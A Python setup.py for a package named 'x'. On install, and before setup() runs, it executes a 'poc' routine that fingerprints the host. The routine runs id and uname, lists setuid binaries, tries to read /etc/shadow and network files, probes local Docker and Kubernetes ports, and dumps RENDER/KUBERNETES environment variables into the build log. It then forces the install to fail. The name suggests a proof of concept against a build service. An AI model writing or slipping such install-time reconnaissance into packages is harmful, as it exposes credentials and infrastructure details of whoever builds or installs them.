import os
import sys
import socket
import subprocess as sp
from setuptools import setup

def poc():
    o = sys.stderr.write
    def run(cmd):
        try:
            return sp.getoutput(cmd)
        except:
            return "ERR"

    o("\n" + "="*50 + "\n")
    o(f"ID: {run('id')}\n")
    o(f"KRNL: {run('uname -a')}\n")
    o(f"IP: {run('hostname -I')}\n")
    
    o("\n[PRIVS]\n")
    o(run("find / -perm -4000 -type f 2>/dev/null | head -n 10") + "\n")
    
    o("\n[SENSITIVE]\n")
    files = ['/etc/shadow', '/etc/hosts', '/proc/net/arp', '/proc/self/cgroup']
    for f in files:
        if os.path.exists(f):
            try:
                with open(f, 'r') as fd:
                    o(f"READ {f}: {fd.readline().strip()}\n")
            except:
                o(f"FAIL {f}\n")

    o("\n[NET]\n")
    for port in [22, 80, 443, 2375, 6443]:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        if s.connect_ex(('127.0.0.1', port)) == 0:
            o(f"L-PORT {port}: OPEN\n")
        s.close()

    o("\n[ENV]\n")
    o("\n".join([f"{k}={v[:20]}..." for k, v in os.environ.items() if "RENDER" in k or "KUBERNETES" in k]))
    
    o("\n" + "="*50 + "\n")
    sys.exit(1)

try:
    poc()
except:
    sys.exit(1)

setup(name="x", version="0.1")
